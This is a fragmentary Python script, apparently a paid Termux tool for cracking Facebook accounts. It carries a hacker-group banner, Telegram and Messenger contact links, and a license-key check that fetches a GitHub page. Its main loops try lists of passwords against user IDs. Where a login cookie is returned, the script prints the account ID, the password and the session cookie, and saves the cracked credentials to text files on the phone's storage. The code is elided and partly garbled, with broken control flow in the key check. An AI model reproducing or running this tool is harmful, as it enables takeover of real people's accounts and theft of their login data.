...
(_))|___|((_)___|((_)___((_)_  ((_)_ ((_|_))   
 |    
                                                                  
\033[41m \033[1;37m           [ASRAF]               \x1b[0m
\033[1;32m   
\033[1;33m [] Admin   : ASRAF\033[1;32m       
\033[1;34m [] Github  :\033[41m\033[1;37mD-N-H-BOYS1[0m                 
\033[1;35m [] Whtsapp : 01641593514          
\033[1;36m [] Youtube : \x1b[38;5;46m nS\x1b[1;97m                           
\033[1;32m   
\033[1;94m
\033[1;97m Status : \033[38;5;46mPAID
\033[1;94m  """)
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://t.me/dnhboys1');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open  https://t.me/dnhboys1');time.sleep(1)
		admin()
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mCounting...\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                print(f'\r\033[1;94mCOOKIE : '+coki)
                open('/sdcard/ABIR-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                open('/sdcard/LM-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [OK] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\33[1;93mNumber : {uid}')
                print(f'\r\033[1;94mCOOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/LM-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [OK] '+cid+'  '+ps+'\33[0;92m')
                print(f'\r\33[1;93m [N] Number : {uid}')
                print(f'\r\033[1;94m [C] COOKIE : '+coki)
...
def apvdef():
    a=str(os.geteuid())
    b=str(os.getlogin())
    row=httpx.get("https://github.com/Alaminnw84").text
       Main()
    else:
       os.system("clear")
       print(logo)
       ...
       print(" plz Get Key")
       print(" Your key : "+key)
       os.system("termux-open https://m.me/dark.net.hacker.boys1")
       sys:exit()
